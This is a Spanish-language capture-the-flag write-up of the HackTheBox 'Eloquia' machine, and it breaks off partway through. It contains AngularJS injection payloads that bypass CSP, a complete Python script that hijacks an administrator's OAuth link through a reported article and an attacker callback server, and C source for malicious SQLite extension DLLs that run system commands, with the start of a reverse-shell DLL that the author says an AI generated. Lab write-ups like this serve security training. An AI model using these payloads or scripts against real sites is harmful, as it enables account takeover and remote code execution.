---
title: Eloquia - Insane (HTB)
permalink: /Eloquia-HTB-Writeup/
tags:
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Eloquia - Insane (HTB)
seo_description: XSS en AngularJS, secuestrar OAuth, ejecutar DLLs maliciosas y comprometer un Windows Server completamente a través de la implementación insegura de permisos en un proyecto.
excerpt: XSS en AngularJS, secuestrar OAuth, ejecutar DLLs maliciosas y comprometer un Windows Server completamente a través de la implementación insegura de permisos en un proyecto.
header:
  overlay_image: /assets/images/headers/eloquia-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/eloquia-hackthebox.jpg
---
![image-center](/assets/images/posts/eloquia-hackthebox.png)
{: .align-center}
# Introducción

Eloquia es una máquina Windows de dificultad Insane en HackTheBox. En este escenario comprometeremos un servidor web que utiliza AngularJS y es vulnerable a XSS, desde un simple `alert()` lograremos comprometer la cuenta del adminstrador del sitio, para luego usando una extensión maliciosa para SQLite obtener ejecución remota de comandos.

Dentro del servidor Windows, descubriremos credenciales para Microsoft Edge almacenadas localmente. Para finalmente abusar de permisos sobre un proyecto personalizado y ganar acceso completo al sistema.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
export TARGET_IP=10.129.1.17
ping -c1 "$TARGET_IP"          
PING 10.129.1.17 (10.129.1.17): 56 data bytes
64 bytes from 10.129.1.17: icmp_seq=0 ttl=127 time=171.286 ms

--- 10.129.1.17 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 171.286/171.286/171.286/0.000 ms
~~~


## Port Scanning 

Realizaremos un escaneo de puertos abiertos en la máquina víctima con el fin de descubrir servicios expuestos

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn "$TARGET_IP" -oG openPorts

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-13 16:04 -0300
Nmap scan report for 10.129.1.17
Host is up (0.21s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 30.51 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un escaneo más exhaustivo frente a los servicios descubiertos, intentando identificar la versión y los servicios que se ejecutan

~~~ bash
nmap -p 80,5985 -sVC "$TARGET_IP"                          
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-13 16:04 -0300
Nmap scan report for 10.129.1.17
Host is up (0.44s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eloquia.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.40 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Solamente vemos dos servicios, `http` y otro el cual corre en el puerto `5985`, aunque este se trata del puerto que Windows usa para el protocolo `winrm` .

El servidor web nos intenta aplicar una redirección hacia `eloquia.htb`. Agregaremos esta información a nuestro archivo `/etc/hosts` para aplicar correctamente las resoluciones DNS

``` bash
echo "$TARGET_IP eloquia.htb" | sudo tee -a /etc/hosts
10.129.1.17 eloquia.htb
```


## Web Enumeration

Al navegar hasta `eloquia.htb`, veremos la siguiente página web

![image-center](/assets/images/posts/eloquia-1-hackthebox.png)
{: .align-center}

### Angular JS

El sitio web está utilizando `AngularJS`. Enumerar las tecnologías web es de vital importancia a la hora de pensar en diferentes vectores de ataque

![image-center](/assets/images/posts/eloquia-2-hackthebox.png)
{: .align-center}

Como sabemos la versión exacta, podemos comenzar a buscar posibles vulnerabilidades conocidas

![image-center](/assets/images/posts/eloquia-3-hackthebox.png)
{: .align-center}

### Register

Podremos tanto registrar una cuenta como iniciar sesión con ella en la plataforma

![image-center](/assets/images/posts/eloquia-4-hackthebox.png)
{: .align-center}

Se requieren los siguientes requisitos a la hora de crear una contraseña:

- Mínimo `8` caracteres
- Contraseña poco común

> Un dato curioso pero que no tiene relevancia para seguir es que puedes registrarte con la casilla de `Terms & Conditions` desmarcada (algo que te obligan a aceptar en todos los servicios modernos).
{: .notice--primary}

### Articles

Desde el `Dashboard` podemos crear artículos en la sección `Create Article`

![image-center](/assets/images/posts/eloquia-5-hackthebox.png)
{: .align-center}

#### CKEditor

> Nota que el formulario soporta `Rich Text` y se nos revela la tecnología que utiliza
{: .notice--warning}

![image-center](/assets/images/posts/eloquia-6-hackthebox.png)
{: .align-center}

Inspeccionando el código fuente podemos ver referencias a `ckeditor`. En este caso la extensión `Wappalyzer` nos muestra la versión utilizada de `CKEditor 5`, la cual es la `41.0.0`

![image-center](/assets/images/posts/eloquia-7-hackthebox.png)
{: .align-center}

Podemos averiguar la versión de forma manual usando la consola del navegador. Abriremos las `Dev Tools > Console` y escribiremos `CKEDITOR_VERSION`

![image-center](/assets/images/posts/eloquia-8-hackthebox.png)
{: .align-center}

#### Report

Cuando publicamos un nuevo artículo podremos reportarlo

![image-center](/assets/images/posts/eloquia-9-hackthebox.png)
{: .align-center}

Al enviar un reporte, saltará un mensaje mencionando que el equipo revisará nuestro reporte

![image-center](/assets/images/posts/eloquia-10-hackthebox.png)
{: .align-center}

### `qooqle.htb`

En `/accounts/login`, bajo el formulario para iniciar sesión, veremos un botón `Log in with Qooqle`. Al hacer `hovering`, veremos el siguiente enlace

``` bash
http://eloquia.htb/accounts/oauth2/qooqle/authorize/
```

![image-center](/assets/images/posts/eloquia-11-hackthebox.png)
{: .align-center}

Al hacer clic sobre `Log in with Qooqle`, el servidor nos aplica una redirección hacia otro dominio, llamado `qooqle.htb`

![image-center](/assets/images/posts/eloquia-12-hackthebox.png)
{: .align-center}

Como nuestra máquina no puede resolver este nombre de dominio, necesitamos agregarlo a nuestro archivo DNS interno (`/etc/hosts`)

``` bash
sudo sed -i 's/eloquia\.htb$/& qooqle.htb/g' /etc/hosts
```

Al recargar la página, somos capaces de alcanzar el dominio `qooqle.htb`

![image-center](/assets/images/posts/eloquia-13-hackthebox.png)
{: .align-center}

La web nos permite iniciar sesión en el siguiente enlace que nos lleva a `/login`

![image-center](/assets/images/posts/eloquia-14-hackthebox.png)
{: .align-center}

Podemos crear una cuenta desde el enlace `Create Account`

![image-center](/assets/images/posts/eloquia-15-hackthebox.png)
{: .align-center}

### OAuth2

Haremos una prueba con este servicio, registraremos una cuenta e iniciaremos sesión con `Qooqle` desde el dominio `eloquia.htb`

![image-center](/assets/images/posts/eloquia-16-hackthebox.png)
{: .align-center}

Al iniciar sesión con `Qooqle`, el servidor cargará la siguiente página

![image-center](/assets/images/posts/eloquia-17-hackthebox.png)
{: .align-center}

Al ingresar nuestras credenciales, el siguiente paso es autorizar la aplicación

![image-center](/assets/images/posts/eloquia-18-hackthebox.png)
{: .align-center}

En la barra superior veremos la URL que inicia un proceso de autenticación OAuth

``` bash
http://qooqle.htb/login/?next=/oauth2/authorize/%3Fclient_id%3DriQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//eloquia.htb/accounts/oauth2/qooqle/callback/
```

- `next` redirige al usuario al flujo de autorización, en este caso a `/oauth/authorize`.
- `client_id` vendría a ser el identificador de la aplicación cliente que solicita autorización (`riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi`).
- `response_type=code` indica que se espera recibir un código de autorización (no necesitamos entrar en detalle sobre esto ahora).
- `redirect_uri` define el endpoint de `eloquia.htb` al que se devuelve el usuario tras autorizar la app (esto suele ser un vector común en ataques OAuth). 

> Aunque este flujo funcionará solamente cuando vinculamos `Qooqle` al dominio `eloquia.htb`
{: .notice--danger}

![image-center](/assets/images/posts/eloquia-19-hackthebox.png)
{: .align-center}

Conectaremos nuestra cuenta iniciando sesión con `Qooqle` desde el botón `Change`

![image-center](/assets/images/posts/eloquia-20-hackthebox.png)
{: .align-center}

#### Login with `Qooqle`

Ahora que tenemos nuestra cuenta de `Qooqle` conectada a `eloquia.htb`, podremos iniciar sesión directamente desde el botón que vimos al inicio

![image-center](/assets/images/posts/eloquia-21-hackthebox.png)
{: .align-center}

El flujo completo de autenticación OAuth2 sería el siguiente visto desde Burp Suite

![image-center](/assets/images/posts/eloquia-22-hackthebox.png)
{: .align-center} 

1. El botón `Login with Qooqle` inicia el flujo solicitando el endpoint `/accounts/oauth2/authorize`.
2. Luego el usuario ve la pantalla de consentimiento, la cual solicita autorización

![image-center](/assets/images/posts/eloquia-23-hackthebox.png)
{: .align-center}

3. Cuando el usuario autoriza la app, el servidor responde con un una redirección al callback

![image-center](/assets/images/posts/eloquia-24-hackthebox.png)
{: .align-center}

4. El usuario es redirigido al `callback` y envía un código como parámetro. 

> Es importante aclarar que este código es dinámico, es generado cada vez que autorizamos la app para iniciar sesión en `eloquia.htb`.
{: .notice--danger}

![image-center](/assets/images/posts/eloquia-25-hackthebox.png)
{: .align-center}

5. Cuando el flujo de autorización finaliza, el servidor redirige al usuario a su perfil, concretamente a `/accounts/connect/`
<br>


# Intrusión / Explotación
---
## HTML Injection

Hasta este punto ya comprendimos más o menos bien como funciona la aplicación en `eloquia.htb`. Donde tenemos una funcionalidad para publicar artículos, comentar y reportar, además de una función de Login con `OAuth2`.

El siguiente paso lógicamente es testear las entradas del usuario con algunos payloads de inyección para validar cómo responde el servidor.

> La entrada que podría convertirse en nuestro vector principal de momento es el editor de artículos.
{: .notice--warning}

![image-center](/assets/images/posts/eloquia-26-hackthebox.png)
{: .align-center}

Desde Burp Suite podemos ver cómo se envía la solcitud al servidor cuando publicamos un artículo

![image-center](/assets/images/posts/eloquia-27-hackthebox.png)
{: .align-center}

Al ver el artículo notaremos que podemos inyectar etiquetas HTML debido a que nuestro texto `here` se muestra en negrita

![image-center](/assets/images/posts/eloquia-28-hackthebox.png)
{: .align-center}

Aunque no tendremos tanta suerte al enviar etiquetas como `script`

![image-center](/assets/images/posts/eloquia-29-hackthebox.png)
{: .align-center}

El servidor sanitiza entradas más peligrosas como etiquetas `<img>`, `<script>`, etc.

![image-center](/assets/images/posts/eloquia-30-hackthebox.png)
{: .align-center}


## Client-Side Template Injection

Como sabemos que el servidor usa `AngularJS`, podemos intentar inyecciones relacionadas a esta tecnología.

> `AngularJS` es un framework de JavaScript de código abierto creado y mantenido por Google, diseñado para facilitar el desarrollo de aplicaciones web de una sola página (SPA, por sus siglas en inglés).
{: .notice--info}

`AngularJS` procesa expresiones directamente en el DOM mediante llaves, por lo que si tenemos este framework ejecutándose en el frontend, vale la pena probar este tipo de inyecciones (similar a SSTI aunque no son lo mismo). 

> Lee los siguientes artículos para una mayor comprensión técnica ([`aszx87410.github.io`](https://aszx87410.github.io/beyond-xss/en/ch3/csti/#client-side-template-injection), [`HackTricks`](https://hacktricks.wiki/es/pentesting-web/client-side-template-injection-csti.html#angularjs))
{: .notice--info}

Sabiendo esto, probaremos validar que el servidor interpreta expresiones, por ejemplo enviar un payload parecido a lo que usaríamos para verificar SSTI

``` bash
{{7*7}}
```

![image-center](/assets/images/posts/eloquia-31-hackthebox.png)
{: .align-center}

El artículo muestra el número `49`, nuestra expresión se renderiza en la app.

![image-center](/assets/images/posts/eloquia-32-hackthebox.png)
{: .align-center}

> Esto nos dice que el servidor no está sanitizando correctamente las llaves y la expresión llega a evaluarse por `AngularJS`.
{: .notice--warning}

Ahora podemos probar inyectar expresiones como las siguientes, como las llaves no se están filtrando, `AngularJS` debería ejecutar nuestra expresión

``` js
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

![image-center](/assets/images/posts/eloquia-33-hackthebox.png)
{: .align-center}

Si vemos la consola del navegador, notaremos que la expresión fue bloqueada por `CSP` (`Content Security Policy`).

> `Content Security Policy` es un mecanismo de seguridad web que le indica al navegador qué recursos (como scripts, imágenes o estilos) tiene permiso para cargar y ejecutar en un sitio web.
{: .notice--info}

![image-center](/assets/images/posts/eloquia-34-hackthebox.png)
{: .align-center}

### CSP Bypass (XSS)

Si prestamos atención a alguna solicitud con Burp Suite, veremos la cabecera relacionada con `CSP`

![image-center](/assets/images/posts/eloquia-35-hackthebox.png)
{: .align-center}

``` http
Content-Security-Policy: style-src 'self' 'unsafe-inline' fonts.googleapis.com; script-src 'self'; font-src 'self' fonts.googleapis.com fonts.gstatic.com; object-src 'none'; default-src 'self'
```

`style-src`, `script-src`, `font-src`, `object-src` y `default-src` están configurados de manera muy restrictiva.

Básicamente estas políticas solamente permiten que las fuentes de scripts, estilos CSS, etc., provengan del servidor, denegando al cliente la posibilidad de ejecutar JavaScript a través de etiquetas HTML o cargar recursos externos como imágenes.

#### AngularJS `ng` Directives

> Las directivas `ng` en `AngularJS` son atributos o elementos especiales (extensiones del HTML estándar) que le indican al framework que debe adjuntar un comportamiento personalizado o manipular el DOM.
{: .notice--info}

Estas directivas permiten añadir comportamiento dinámico al HTML. Por ejemplo, una etiqueta que contenga la directiva `ng-click` puede enviar código JavaScript directamente a `AngularJS` para que sea ejecutado al hacer click en el texto.

``` html
<a ng-click=$event.view.alert(1)>angular</a>
```

![image-center](/assets/images/posts/eloquia-36-hackthebox.png)
{: .align-center}

Al hacer clic en el texto `angular`, veremos como aparece un pop up con el número 1, esto confirma la ejecución `javascript`

![image-center](/assets/images/posts/eloquia-37-hackthebox.png)
{: .align-center}

> `AngularJS` utiliza su propio intérprete de expresiones, por lo que el CSP no bloquea la ejecución al no utilizar `eval()`.
{: .notice--info}

Podemos cambiar de evento para que se ejecute sin interacción del usuario. Para esto podemos intentar probar eventos como `ng-focus` combinado con `autofocus` (`tabindex="1"` o `tabindex="-1"` para un resultado más confiable).

Utilizaremos un payload parecido al siguiente:

``` html
<a autofocus tabindex="1" ng-focus=$event.view.alert(1)>angular</a>
```

Al crear el artículo y seguir la redirección, veremos cómo sin necesidad de interactuar se ejecuta un `alert(1)`

![image-center](/assets/images/posts/eloquia-38-hackthebox.png)
{: .align-center}

#### Client Side Redirect

> En este momento este es nuestra principal barrera es el CSP y sus directivas restrictivas, aunque una cosa a tener en cuenta es que el CSP bloquea los recursos que el navegador carga y ejecuta, pero **no bloquea a dónde nos redirige una respuesta HTTP**.
{: .notice--warning}

En este momento podemos pensar en usar el mecanismo de `Cient-Side Redirect`, buscando alguna etiqueta HTML o expresión de `AngularJS` que permita redireccionar al cliente hacia otro servidor. En este caso he optado por la propiedad `windowlocation`

``` html
<a autofocus tabindex="1" ng-focus=$event.view.location='http://<your-htb-ip>/hello-from-angular'>angular</a>
```

> En el contexto de `AngularJS`, `$event.view` sería una referencia directa al objeto global `window`. Por ejemplo en un XSS normal usaríamos `window.location`.
{: .notice--info}

![image-center](/assets/images/posts/eloquia-39-hackthebox.png)
{: .align-center}

Ahora debemos hacer que un admin visite nuestro artículo para que sea ridirigido a nuestro servidor. Recordemos la funcionalidad de `Report Article`. 

Desde Burp Suite podemos ver que para reportar un artículo solamente hace falta enviar una petición `GET` enviando el `id` del reporte

![image-center](/assets/images/posts/eloquia-40-hackthebox.png)
{: .align-center}

Visitaremos `/article/report/<id>` pasando el `id` del reporte que tiene nuestro payload, o bien usando `curl` con las cookies de nuestra sesión

![image-center](/assets/images/posts/eloquia-41-hackthebox.png)
{: .align-center}

``` bash
curl -si http://eloquia.htb/article/report/41/ -b 'csrftoken=S5SmiX5LQ7qLPYuN7Hrcz8oOc1vSiANS;sessionid=weg8i1bi59fiak8st2wi793yp6asvo0s'
HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: /article/visit/41/
Server: Microsoft-IIS/10.0
Set-Cookie: messages=.eJwty8EJwzAMRuFVfnw2oRQ6QCfoACEY48qtihIFS0nI9vGh5_e9cQwp_UyXNJNZ_lCIt3h_xPBszkUIjVZtTm_YVkondRM5B7y2Bqc842CRjnamA_5lQ_6PrjAicAU7dlbJTr0uJ7RC-76qcGGyIcQQpukCWRowyw:1xIYm2:FElzTJM7kMUDpnEjFxHvADW7q4UESlU8zPeAD68AN5o; HttpOnly; Path=/; SameSite=Lax
Content-Security-Policy: style-src 'self' 'unsafe-inline' fonts.googleapis.com; script-src 'self'; default-src 'self'; font-src 'self' fonts.googleapis.com fonts.gstatic.com; object-src 'none'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
X-Powered-By: ARR/3.0
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Date: Sun, 18 Oct 2026 21:50:34 GMT
Content-Length: 0
```

En unos momentos, recibiremos una solicitud desde la IP de la máquina 

``` bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.134.175 - - [18/Oct/2026 18:50:55] code 404, message File not found
10.129.134.175 - - [18/Oct/2026 18:50:55] "GET /hello-from-angular HTTP/1.1" 404 -
10.129.134.175 - - [18/Oct/2026 18:50:55] code 404, message File not found
10.129.134.175 - - [18/Oct/2026 18:50:55] "GET /favicon.ico HTTP/1.1" 404 -
```

> También es posible una forma alternativa, usando el siguiente recurso de [`HackTricks`](https://hacktricks.wiki/en/pentesting-web/open-redirect.html#hunting-and-exploitation-workflow-practical)
{: .notice--info}

``` html
<meta http-equiv="refresh" content="0;url=http://<your-htb-ip>/test">
```

![image-center](/assets/images/posts/eloquia-42-hackthebox.png)
{: .align-center}

También recibiremos una solicitud HTTP proveniente del servidor

``` bash
10.129.134.175 - - [18/Oct/2026 18:53:53] code 404, message File not found
10.129.134.175 - - [18/Oct/2026 18:53:53] "GET /meta-tag HTTP/1.1" 404 -
```


## OAuth Hijacking

Ahora que somos capaces de que el servidor realice una solicitud, aparece un vector interesante. Hacer que el administrador de la web inicie un flujo OAuth y autorice nuestra cuenta usando `Qooqle`. Haremos una prueba rápida con una segunda cuenta.

Recordemos el flujo OAuth2, cuando hacemos clic en `Authorize` el servidor genera un código único.

![image-center](/assets/images/posts/eloquia-43-hackthebox.png)
{: .align-center}

Siguiendo la redirección, el usuario envía este código a través de un GET. Sabemos que la cuenta fue vinculada porque el servidor aplica otra redirección a `/accounts/connect`

![image-center](/assets/images/posts/eloquia-44-hackthebox.png)
{: .align-center}

> El problema viene cuando dejamos pasar mucho tiempo para usar este código único.
{: .notice--danger}

![image-center](/assets/images/posts/eloquia-45-hackthebox.png)
{: .align-center}

### Automated Exploitation

En mi caso decidí automatizar este proceso hasta el abuso de OAuth para obtener acceso a la web como `admin`. 

De esta forma no dependeremos de usar rápidamente el código OAuth que devuelve el servidor porque gestionamos todo el flujo, redirigiendo al usuario automáticamente para que él mismo lo envíe y complete la autorización 

``` python
#!/usr/bin/env python3
import requests
import sys
import signal
import argparse
import uuid
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import time

# Global variables
eloquia_url = 'http://eloquia.htb'
qooqle_url = 'http://qooqle.htb'
oauth_client_id = 'riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi'
oauth_redirect_uri = f'{eloquia_url}/accounts/oauth2/qooqle/callback/'

# Burpsuite Proxy
burp = { 'http': 'http://localhost:8080' }

# Ctrl + C
def handler(sig, frame):
    print("[-] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, handler)


def get_csrf_token(html):
    match = re.search(
        r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)["\']',
        html
    )
    if match:
        return match.group(1)
    else: 
        return None


def login(username, password):
    session = requests.Session()
    login_url = f'{eloquia_url}/accounts/login/'

    response = session.get(login_url)
    csrf_token = get_csrf_token(response.text)

    data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': username,
        'password': password
    }
    try:
        response = session.post(login_url, data=data, proxies=burp, allow_redirects=False)
        if response.status_code == 302:
            return session
    except Exception as e:
        print('[!] Eloquia Login failed')
        return


def qooqle_login(username, password):
    session = requests.Session()
    login_url = f'{qooqle_url}/login/'
    response = session.get(login_url)
    csrf_token = get_csrf_token(response.text)

    data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': username,
        'password': password
    }
    try:
        response = session.post(login_url, data=data, proxies=burp, allow_redirects=False)
        if response.status_code == 302:
            return session
    except Exception as e:
        print('[!] Qoole Login failed')
        return


def create_article(session, callback_url):
    article_editor_url = f'{eloquia_url}/article/create/'
    response = session.get(article_editor_url)
    csrf_token = get_csrf_token(response.text)   
    title = 'XSS Test'
    payload = f'<p><meta http-equiv="refresh" content="0;url={callback_url}"></p>'
    data = {
        'csrfmiddlewaretoken': csrf_token,
        'title': title,
        'content': payload
    }
    try:
        banner_image = 'test.png'
        with open(banner_image, 'rb') as img:
            files = { 'banner': (banner_image, img.read(), 'image/png') }
    except Exception as e:
        print(f'[!] {e}')
    
    response = session.post(article_editor_url, data=data, files=files, proxies=burp, allow_redirects=False)
    if not response.status_code == 302:
        print("[!] An error with article creation")

    location = response.headers.get('Location', '')
    print(f'[*] {location}')
    match = re.search(r'/article/visit/(\d+)/', location)
    if match:
        return match.group(1)
    return None


def report_article(session, article_id):
    report_url = f'{eloquia_url}/article/report/{article_id}/'
    response = session.get(report_url, proxies=burp, allow_redirects=False)
    if response.status_code == 302:
        return True
    return


def get_oauth_code(session):
    redirect_uri = f'{eloquia_url}/accounts/oauth2/qooqle/callback/'  
    authorize_url = (
    f'{qooqle_url}/oauth2/authorize/'
    f'?client_id={oauth_client_id}'
    f'&response_type=code'
    f'&redirect_uri={oauth_redirect_uri}'
    )
    response = session.get(authorize_url, proxies=burp)

    if not response.status_code == 200:
        print('[!] OAuth Authorize failed')

    csrf_token = get_csrf_token(response.text)

    data = {
        'csrfmiddlewaretoken': csrf_token,
        'redirect_uri': redirect_uri,
        'scope': 'read write',
        'nonce': '',
        'client_id': oauth_client_id,
        'state': '',
        'response_type': 'code',
        'code_challenge': '',
        'code_challenge_method': '',
        'claims': '',
        'allow': 'Authorize'
    }
    headers = {
        'Origin': qooqle_url,
        'Referer': authorize_url
    }
    response = session.post(authorize_url, data=data, headers=headers, proxies=burp, allow_redirects=False)
    if response.status_code == 302:
        location = response.headers.get('Location', '')
        print(f'[*] {location}')
        return location
    return


# HTTP Requests handler
class HTTPHandler(BaseHTTPRequestHandler):
    username = None
    password = None
    exploited = False
    
    def do_GET(self):
        if self.path == '/exploit':
            print('[+] Admin HTTP request detected')
            
            try:
                print('[*] Logging into Qooqle as attacker...')
                session = qooqle_login(HTTPHandler.username, HTTPHandler.password)
                if not session:
                    print('[!] Qooqle Login failed!')
                    return

                print('[+] Qooqle Login success!')
                redirect_url = get_oauth_code(session)
                self.send_response(302)
                self.send_header('Location', redirect_url)
                print('[*] Redirecting admin to Callback')
                self.end_headers()
                print('[+] Exploited')
                HTTPHandler.exploited = True

            except Exception as e:
                print(f'[!] {e}')
                self.send_response(500)
                self.end_headers()

def run_server(host, port):
    server = HTTPServer((host, port), HTTPHandler)
    print(f'[*] Callback server listening on http://{host}:{port}/')
    server.serve_forever()


# Main
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-user', '--username', help='Account username', type=str, required=True)
    parser.add_argument('-password', '--password', help='Account password', type=str, required=True)
    parser.add_argument('-i', '--attacker-ip', help='Attacker IP', type=str, required=True)
    parser.add_argument('-p', '--attacker-port', help='Attacker Port', default=80, type=int)
    args = parser.parse_args()

    username = args.username
    password = args.password
    attacker_ip = args.attacker_ip
    attacker_port = args.attacker_port
    
    HTTPHandler.username = username
    HTTPHandler.password = password

    thread = threading.Thread(target=run_server, args=(attacker_ip, attacker_port))
    thread.daemon = True
    thread.start()
    time.sleep(1)

    callback_url = f'http://{attacker_ip}:{attacker_port}/exploit'

    if not (args.username and args.password):
        parser.print_help(sys.stderr)
    
    print('[*] Logging in eloquia.htb...')
    session = login(username, password)
    if session:
        print('[+] Eloquia Login success')
        article_id = create_article(session, callback_url)
        if not article_id:
            print('[!] Error with article creation')
        print("[+] Article created successfully!")
        reported = report_article(session, article_id)
        if not reported:
            print(f'[!] Error with article {article_id}')
        print(f'[+] Article {article_id} reported!, please wait for HTTP request')
        
        try:
            while not HTTPHandler.exploited:
                time.sleep(1)
            print(f'[+] Done, login using "Log in with Qooqle" as {username}')
        except Exception as e:
            print('[!] Error with HTTP server')
```

De esta forma, el administrador de la web autorizará nuestra cuenta usando `OAuth` al inyectar una etiqueta que redirige al navegador hacia nuestro servidor

``` bash
uv run --with requests oauth.py -user incommatose -password 'Test123!' -i 10.10.15.242 -p 8000
[*] Callback server listening on http://10.10.15.242:8000/
[*] Logging in eloquia.htb...
[+] Eloquia Login success
[*] /article/visit/44/
[+] Article created successfully!
[+] Article 44 reported!, please wait for HTTP request
[+] Admin HTTP request detected
[*] Logging into Qooqle as attacker...
[+] Qooqle Login success!
[*] http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=LP3oMdFfFYhignDUh4ZWNHEMr6KNPo
10.129.134.175 - - [18/Oct/2026 19:56:58] "GET /exploit HTTP/1.1" 302 -
[*] Redirecting admin to Callback
[+] Exploited
[+] Done, login using "Log in with Qooqle" as incommatose
```


## Web Admin Access

Al iniciar sesión en la plataforma desde `Log in with Qooqle`, entraremos con una sesión de administración como el usuario `admin`

![image-center](/assets/images/posts/eloquia-46-hackthebox.png)
{: .align-center}

Desde la pestaña `Admin Panel`, entraremos a un apartado de administración de la web

![image-center](/assets/images/posts/eloquia-47-hackthebox.png)
{: .align-center}

### Articles Editor

Desde la pestaña `Articles` tendremos disponible un editor de artículos

![image-center](/assets/images/posts/eloquia-48-hackthebox.png)
{: .align-center}

### SQL Explorer

Tendremos disponible una opción `SQL Explorer`, la cual nos llevará a la siguiente plataforma.

![image-center](/assets/images/posts/eloquia-49-hackthebox.png)
{: .align-center}

![image-center](/assets/images/posts/eloquia-50-hackthebox.png)
{: .align-center}

> [`SQL Explorer`](https://www.sqlexplorer.io/) es una herramienta de gestión y análisis de bases de datos que cuenta con un editor SQL asistido por inteligencia artificial, navegador de esquemas con autocompletado y tablas pivote en el navegador.
{: .notice--info}

Podemos ejecutar queries `SQL` rápidamente desde la pestaña `New Query`

``` sql
select sqlite_version();
```

![image-center](/assets/images/posts/eloquia-51-hackthebox.png)
{: .align-center}


## Abusing SQLite Load Extensions

Podemos hacer uso de la función [`load_extension`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#load_extension) para intentar cargar una `DLL` controlada por nosotros. 

La siguiente query intenta validar si esta función está habilitada, porque por defecto no lo está

``` sql
SELECT load_extension('test');
```

Veremos un mensaje de error, haciendo alusión a que no se ha encontrado la extensión. Aunque sea un error, esto es una buena señal

![image-center](/assets/images/posts/eloquia-52-hackthebox.png)
{: .align-center}

### Custom Extension

Crearemos nuestra extensión maliciosa en `C` definiendo la [siguiente estructura](https://sqlite.org/loadext.html).

``` c
#include <stdlib.h>

#ifdef _WIN32
__declspec(dllexport)
#endif
int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi){
  int rc = SQLITE_OK;
  SQLITE_EXTENSION_INIT2(pApi);
  
  /* RCE Test */
  system("whoami > static/assets/images/blog/test.txt'");
  
  return rc;
}
```

A menos que descarguemos el archivo `sqlite3.h`, este código de ejemplo no compilará correctamente. Aplicaremos unos ajustes para simplificar el código y simplemente ejecutar un comando en el sistema como prueba

``` c
#include <windows.h>

__declspec(dllexport) int sqlite3_extension_init() {
    system("whoami > static/assets/images/blog/test.txt");
    return 0;
}
```

Compilaremos nuestra DLL desde Linux usando `x86_64-w64-mingw32-gcc`

``` bash
x86_64-w64-mingw32-gcc -shared -o test.dll dll.c
```

### Load DLL

Editaremos un artículo desde `Articles` > `Article Object (X)`, donde cargarmoes nuestra DLL

![image-center](/assets/images/posts/eloquia-53-hackthebox.png)
{: .align-center}

Al editar el artículo notaremos que nuestra DLL se almacena en la ruta `static/assets/images/blog`

![image-center](/assets/images/posts/eloquia-54-hackthebox.png)
{: .align-center}

Volveremos al SQL Explorer para cargar la extensión usando la función `load_extension()`. En este caso debemos pasar la ruta donde el servidor la almacenó

``` sql
SELECT load_extension('static\assets\images\blog\evil.dll');
```

Sabremos que la ejecución se logró al intentar visitar nuestro archivo de prueba en el servidor web

``` bash
curl http://eloquia.htb/static/assets/images/blog/test.txt

eloquia\web
```

En este caso el archivo `test.txt` fue creado, y contiene la salida del comando `whoami`, tal como lo planeamos

![image-center](/assets/images/posts/eloquia-55-hackthebox.png)
{: .align-center}

### Shell

Ahora que validamos ejecución de comandos, podemos enviar una shell a nuestra máquina por un puerto.

> Haciendo unas pruebas, no obtendremos una reverse shell directamente usando `powershell`. Esto puede deberse a alguna protrección implementada en el sistema, como por ejemplo un antivirus, AMSI, AppLocker, etc.
{: .notice--danger}

``` c
// extensión generada por Deepseek para propósitos ACADÉMICOS
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

typedef struct sqlite3            sqlite3;
